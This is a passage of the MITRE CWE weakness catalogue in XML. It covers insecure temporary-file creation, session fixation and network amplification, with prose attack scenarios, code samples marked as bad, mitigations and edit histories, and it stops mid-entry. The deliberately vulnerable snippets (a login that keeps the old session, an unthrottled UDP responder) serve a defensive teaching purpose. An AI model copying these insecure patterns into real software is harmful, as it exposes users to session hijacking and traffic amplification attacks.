            <Taxonomy_Mapping Taxonomy_Name="The CERT Oracle Secure Coding Standard for Java (2011)">
               <Entry_ID>FIO00-J</Entry_ID>
               <Entry_Name>Do not operate on files in shared directories</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="149"/>
            <Related_Attack_Pattern CAPEC_ID="155"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-6"/>
            <Reference External_Reference_ID="REF-7" Section="Chapter 23, &#34;Creating Temporary Files Securely&#34; Page 682"/>
            <Reference External_Reference_ID="REF-62" Section="Chapter 9, &#34;Temporary Files&#34;, Page 538"/>
            <Reference External_Reference_ID="REF-62" Section="Chapter 11, &#34;File Squatting&#34;, Page 662"/>
         </References>
         <Mapping_Notes>
            <Usage>Allowed-with-Review</Usage>
            <Rationale>This CWE entry is a Class and might have Base-level children that would be more appropriate</Rationale>
            <Comments>Examine children of this entry to see if there is a better fit</Comments>
            <Reasons>
               <Reason Type="Abstraction"/>
            </Reasons>
         </Mapping_Notes>
         <Notes>
            <Note Type="Other">
               <xhtml:p>Applications require temporary files so frequently that many different mechanisms exist for creating them in the C Library and Windows(R) API. Most of these functions are vulnerable to various forms of attacks.</xhtml:p>
               <xhtml:p>The functions designed to aid in the creation of temporary files can be broken into two groups based whether they simply provide a filename or actually open a new file. - Group 1: "Unique" Filenames: The first group of C Library and WinAPI functions designed to help with the process of creating temporary files do so by generating a unique file name for a new temporary file, which the program is then supposed to open. This group includes C Library functions like tmpnam(), tempnam(), mktemp() and their C++ equivalents prefaced with an _ (underscore) as well as the GetTempFileName() function from the Windows API. This group of functions suffers from an underlying race condition on the filename chosen. Although the functions guarantee that the filename is unique at the time it is selected, there is no mechanism to prevent another process or an attacker from creating a file with the same name after it is selected but before the application attempts to open the file. Beyond the risk of a legitimate collision caused by another call to the same function, there is a high probability that an attacker will be able to create a malicious collision because the filenames generated by these functions are not sufficiently randomized to make them difficult to guess. If a file with the selected name is created, then depending on how the file is opened the existing contents or access permissions of the file may remain intact. If the existing contents of the file are malicious in nature, an attacker may be able to inject dangerous data into the application when it reads data back from the temporary file. If an attacker pre-creates the file with relaxed access permissions, then data stored in the temporary file by the application may be accessed, modified or corrupted by an attacker. On Unix based systems an even more insidious attack is possible if the attacker pre-creates the file as a link to another important file. Then, if the application truncates or writes data to the file, it may unwittingly perform damaging operations for the attacker. This is an especially serious threat if the program operates with elevated permissions. Finally, in the best case the file will be opened with the a call to open() using the O_CREAT and O_EXCL flags or to CreateFile() using the CREATE_NEW attribute, which will fail if the file already exists and therefore prevent the types of attacks described above. However, if an attacker is able to accurately predict a sequence of temporary file names, then the application may be prevented from opening necessary temporary storage causing a denial of service (DoS) attack. This type of attack would not be difficult to mount given the small amount of randomness used in the selection of the filenames generated by these functions. - Group 2: "Unique" Files: The second group of C Library functions attempts to resolve some of the security problems related to temporary files by not only generating a unique file name, but also opening the file. This group includes C Library functions like tmpfile() and its C++ equivalents prefaced with an _ (underscore), as well as the slightly better-behaved C Library function mkstemp(). The tmpfile() style functions construct a unique filename and open it in the same way that fopen() would if passed the flags "wb+", that is, as a binary file in read/write mode. If the file already exists, tmpfile() will truncate it to size zero, possibly in an attempt to assuage the security concerns mentioned earlier regarding the race condition that exists between the selection of a supposedly unique filename and the subsequent opening of the selected file. However, this behavior clearly does not solve the function's security problems. First, an attacker can pre-create the file with relaxed access-permissions that will likely be retained by the file opened by tmpfile(). Furthermore, on Unix based systems if the attacker pre-creates the file as a link to another important file, the application may use its possibly elevated permissions to truncate that file, thereby doing damage on behalf of the attacker. Finally, if tmpfile() does create a new file, the access permissions applied to that file will vary from one operating system to another, which can leave application data vulnerable even if an attacker is unable to predict the filename to be used in advance. Finally, mkstemp() is a reasonably safe way create temporary files. It will attempt to create and open a unique file based on a filename template provided by the user combined with a series of randomly generated characters. If it is unable to create such a file, it will fail and return -1. On modern systems the file is opened using mode 0600, which means the file will be secure from tampering unless the user explicitly changes its access permissions. However, mkstemp() still suffers from the use of predictable file names and can leave an application vulnerable to denial of service attacks if an attacker causes mkstemp() to fail by predicting and pre-creating the filenames to be used.</xhtml:p>
            </Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>7 Pernicious Kingdoms</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
               <Submission_Version>Draft 3</Submission_Version>
               <Submission_ReleaseDate>2006-07-19</Submission_ReleaseDate>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Other_Notes, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-03-10</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated References, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, References, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2018-03-27</Modification_Date>
               <Modification_Comment>updated References</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-01-03</Modification_Date>
					<Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated References, Relationships, Type</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated Detection_Factors, Relationships, Time_of_Introduction</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-10-26</Modification_Date>
					<Modification_Comment>updated Observed_Examples</Modification_Comment>
				</Modification>
         </Content_History>
      </Weakness>
      <Weakness ID="384" Name="Session Fixation" Abstraction="Compound" Structure="Composite" Status="Incomplete">
         <Description>Authenticating a user, or otherwise establishing a new user session, without invalidating any existing session identifier gives an attacker the opportunity to steal authenticated sessions.</Description>
         <Extended_Description>
            <xhtml:p>Such a scenario is commonly observed when:</xhtml:p>
            <xhtml:ul>
               <xhtml:li>A web application authenticates a user without first invalidating the existing session, thereby continuing to use the session already associated with the user.</xhtml:li>
               <xhtml:li>An attacker is able to force a known session identifier on a user so that, once the user authenticates, the attacker has access to the authenticated session.</xhtml:li>
               <xhtml:li>The application or container uses predictable session identifiers.</xhtml:li>
	    </xhtml:ul>
	    <xhtml:p>In the generic exploit of session fixation vulnerabilities, an attacker creates a new session on a web application and records the associated session identifier. The attacker then causes the victim to associate, and possibly authenticate, against the server using that session identifier, giving the attacker access to the user's account through the active session.</xhtml:p>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="610" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="610" View_ID="1003" Ordinal="Primary"/>
            <Related_Weakness Nature="Requires" CWE_ID="346" View_ID="1000"/>
            <Related_Weakness Nature="Requires" CWE_ID="472" View_ID="1000"/>
            <Related_Weakness Nature="Requires" CWE_ID="441" View_ID="1000"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Gain Privileges or Assume Identity</Impact>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Invalidate any existing session identifiers prior to authorizing a new user session.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>For platforms such as ASP that do not generate new values for sessionid cookies, utilize a secondary cookie. In this approach, set a secondary cookie on the user's browser to a random value and set a session variable to the same value. If the session variable and the cookie value ever don't match, invalidate the session, and force the user to log on again.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>The following example shows a snippet of code from a J2EE web application where the application authenticates users with LoginContext.login() without first calling HttpSession.invalidate().</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>private void auth(LoginContext lc, HttpSession session) throws LoginException {<xhtml:div style="margin-left:1em;">...<xhtml:br/>lc.login();<xhtml:br/>...</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>In order to exploit the code above, an attacker could first create a session (perhaps by logging into the application) from a public terminal, record the session identifier assigned by the application, and reset the browser to the login page. Next, a victim sits down at the same public terminal, notices the browser open to the login page of the site, and enters credentials to authenticate against the application. The code responsible for authenticating the victim continues to use the pre-existing session identifier, now the attacker simply uses the session identifier recorded earlier to access the victim's active session, providing nearly unrestricted access to the victim's account for the lifetime of the session. Even given a vulnerable application, the success of the specific attack described here is dependent on several factors working in the favor of the attacker: access to an unmonitored public terminal, the ability to keep the compromised session active and a victim interested in logging into the vulnerable application on the public terminal.</Body_Text>
               <Body_Text>In most circumstances, the first two challenges are surmountable given a sufficient investment of time. Finding a victim who is both using a public terminal and interested in logging into the vulnerable application is possible as well, so long as the site is reasonably popular. The less well known the site is, the lower the odds of an interested victim using the public terminal and the lower the chance of success for the attack vector described above. The biggest challenge an attacker faces in exploiting session fixation vulnerabilities is inducing victims to authenticate against the vulnerable application using a session identifier known to the attacker.</Body_Text>
               <Body_Text>In the example above, the attacker did this through a direct method that is not subtle and does not scale suitably for attacks involving less well-known web sites. However, do not be lulled into complacency; attackers have many tools in their belts that help bypass the limitations of this attack vector. The most common technique employed by attackers involves taking advantage of cross-site scripting or HTTP response splitting vulnerabilities in the target site [12]. By tricking the victim into submitting a malicious request to a vulnerable application that reflects JavaScript or other code back to the victim's browser, an attacker can create a cookie that will cause the victim to reuse a session identifier controlled by the attacker. It is worth noting that cookies are often tied to the top level domain associated with a given URL. If multiple applications reside on the same top level domain, such as bank.example.com and recipes.example.com, a vulnerability in one application can allow an attacker to set a cookie with a fixed session identifier that will be used in all interactions with any application on the domain example.com [29].</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>The following example shows a snippet of code from a J2EE web application where the application authenticates users with a direct post to the &lt;code&gt;j_security_check&lt;/code&gt;, which typically does not invalidate the existing session before processing the login request.</Intro_Text>
               <Example_Code Nature="Bad" Language="HTML">
                  <xhtml:div>&lt;form method="POST" action="j_security_check"&gt;<xhtml:div style="margin-left:1em;">&lt;input type="text" name="j_username"&gt;<xhtml:br/>&lt;input type="text" name="j_password"&gt;</xhtml:div>&lt;/form&gt;</xhtml:div>
               </Example_Code>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2022-2820</Reference>
               <Description>Website software for game servers does not proprerly terminate user sessions, allowing for possible session fixation</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-2820</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="7 Pernicious Kingdoms">
               <Entry_Name>Session Fixation</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2004">
               <Entry_ID>A3</Entry_ID>
               <Entry_Name>Broken Authentication and Session Management</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="WASC">
               <Entry_ID>37</Entry_ID>
               <Entry_Name>Session Fixation</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="196"/>
            <Related_Attack_Pattern CAPEC_ID="21"/>
            <Related_Attack_Pattern CAPEC_ID="31"/>
            <Related_Attack_Pattern CAPEC_ID="39"/>
            <Related_Attack_Pattern CAPEC_ID="59"/>
            <Related_Attack_Pattern CAPEC_ID="60"/>
            <Related_Attack_Pattern CAPEC_ID="61"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-6"/>
         </References>
         <Mapping_Notes>
            <Usage>Allowed</Usage>
            <Rationale>This is a well-known Composite of multiple weaknesses that must all occur simultaneously, although it is attack-oriented in nature.</Rationale>
            <Comments>While attack-oriented composites are supported in CWE, they have not been a focus of research. There is a chance that future research or CWE scope clarifications will change or deprecate them. Perform root-cause analysis to determine which weaknesses allow session fixation to occur, and map to those weaknesses. For example, predictable session identifiers might enable session fixation attacks to succeed; if this occurs, they might be better characterized as randomness/predictability weaknesses.</Comments>
            <Reasons>
               <Reason Type="Other"/>
            </Reasons>
         </Mapping_Notes>
         <Notes>
            <Note Type="Other">Other attack vectors include DNS poisoning and related network based attacks where an attacker causes the user to visit a malicious site by redirecting a request for a valid site. Network based attacks typically involve a physical presence on the victim's network or control of a compromised machine on the network, which makes them harder to exploit remotely, but their significance should not be overlooked. Less secure session management mechanisms, such as the default implementation in Apache Tomcat, allow session identifiers normally expected in a cookie to be specified on the URL as well, which enables an attacker to cause a victim to use a fixed session identifier simply by emailing a malicious URL.</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>7 Pernicious Kingdoms</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
               <Submission_Version>Draft 3</Submission_Version>
               <Submission_ReleaseDate>2006-07-19</Submission_ReleaseDate>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Organization>Veracode</Modification_Organization>
               <Modification_Date>2008-08-15</Modification_Date>
               <Modification_Comment>Suggested OWASP Top Ten 2004 mapping</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Description, Relationships, Other_Notes, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-07-27</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-07-17</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Modes_of_Introduction, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2018-03-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated References, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-06-25</Modification_Date>
					<Modification_Comment>updated Description</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-10-26</Modification_Date>
					<Modification_Comment>updated Observed_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2024-07-16</Modification_Date>
					<Modification_Version>4.15</Modification_Version>
					<Modification_ReleaseDate>2024-07-16</Modification_ReleaseDate>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
         </Content_History>
      </Weakness>
      <Weakness ID="406" Name="Insufficient Control of Network Message Volume (Network Amplification)" Abstraction="Class" Structure="Simple" Status="Incomplete">
         <Description>The product does not sufficiently monitor or control transmitted network traffic volume, so that an actor can cause the product to transmit more traffic than should be allowed for that actor.</Description>
         <Extended_Description>In the absence of a policy to restrict asymmetric resource consumption, the application or system cannot distinguish between legitimate transmissions and traffic intended to serve as an amplifying attack on target systems. Systems can often be configured to restrict the amount of traffic sent out on behalf of a client, based on the client's origin or access level. This is usually defined in a resource allocation policy. In the absence of a mechanism to keep track of transmissions, the system or application can be easily abused to transmit asymmetrically greater traffic than the request or client should be permitted to.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="405" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Operation</Phase>
            </Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>If the application uses UDP, then it could potentially be subject to spoofing attacks that use the inherent weaknesses of UDP to perform traffic amplification, although this problem can exist in other protocols or contexts.</Note>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Availability</Scope>
               <Impact>DoS: Amplification</Impact>
               <Impact>DoS: Crash, Exit, or Restart</Impact>
               <Impact>DoS: Resource Consumption (CPU)</Impact>
               <Impact>DoS: Resource Consumption (Memory)</Impact>
               <Impact>DoS: Resource Consumption (Other)</Impact>
               <Note>System resources can be quickly consumed leading to poor application performance or system crash. This may affect network performance and could be used to attack other systems and applications relying on network performance.</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Strategy>Separation of Privilege</Strategy>
               <Description>An application must make network resources available to a client commensurate with the client's access level.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Policy</Phase>
               <Description>Define a clear policy for network resource allocation and consumption.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>An application must, at all times, keep track of network resources and meter their usage appropriately.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-113">
               <Intro_Text>This code listens on a port for DNS requests and sends the result to the requesting address.</Intro_Text>
               <Example_Code Nature="Bad" Language="Python">
                  <xhtml:div>sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)<xhtml:br/>sock.bind( (UDP_IP,UDP_PORT) )<xhtml:br/>while true:<xhtml:div style="margin-left:1em;">
                        <xhtml:div>data = sock.recvfrom(1024)<xhtml:br/>if not data:<xhtml:div style="margin-left:1em;">break</xhtml:div>
                           <xhtml:br/>(requestIP, nameToResolve) = parseUDPpacket(data)<xhtml:br/>record = resolveName(nameToResolve)<xhtml:br/>sendResponse(requestIP,record)</xhtml:div>
                     </xhtml:div>
                  </xhtml:div>
               </Example_Code>
               <Body_Text>This code sends a DNS record to a requesting IP address. UDP allows the source IP address to be easily changed ('spoofed'), thus allowing an attacker to redirect responses to a target, which may be then be overwhelmed by the network traffic.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-1999-0513</Reference>
               <Description>Classic "Smurf" attack, using spoofed ICMP packets to broadcast addresses.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-1999-0513</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-1999-1379</Reference>
               <Description>DNS query with spoofed source address causes more traffic to be returned to spoofed address than was sent by the attacker.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-1999-1379</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2000-0041</Reference>
               <Description>Large datagrams are sent in response to malformed datagrams.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2000-0041</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-1999-1066</Reference>
               <Description>Game server sends a large amount.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-1999-1066</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2013-5211</Reference>
               <Description>composite: NTP feature generates large responses (high amplification factor) with spoofed UDP source addresses.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2013-5211</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>Network Amplification</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Mapping_Notes>
            <Usage>Allowed-with-Review</Usage>
            <Rationale>This CWE entry is a Class and might have Base-level children that would be more appropriate</Rationale>
            <Comments>Examine children of this entry to see if there is a better fit</Comments>
            <Reasons>
               <Reason Type="Abstraction"/>
            </Reasons>
         </Mapping_Notes>
         <Notes>
            <Note Type="Relationship">This can be resultant from weaknesses that simplify spoofing attacks.</Note>
            <Note Type="Theoretical">Network amplification, when performed with spoofing, is normally a multi-channel attack from attacker (acting as user) to amplifier, and amplifier to victim.</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
               <Submission_Version>Draft 3</Submission_Version>
               <Submission_ReleaseDate>2006-07-19</Submission_ReleaseDate>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Other_Notes, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-10-14</Modification_Date>
               <Modification_Comment>updated Description, Enabling_Factors_for_Exploitation, Name, Other_Notes, Theoretical_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Other_Notes, Relationship_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-02-18</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Observed_Examples, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Enabling_Factors_for_Exploitation, Modes_of_Introduction</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Type</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
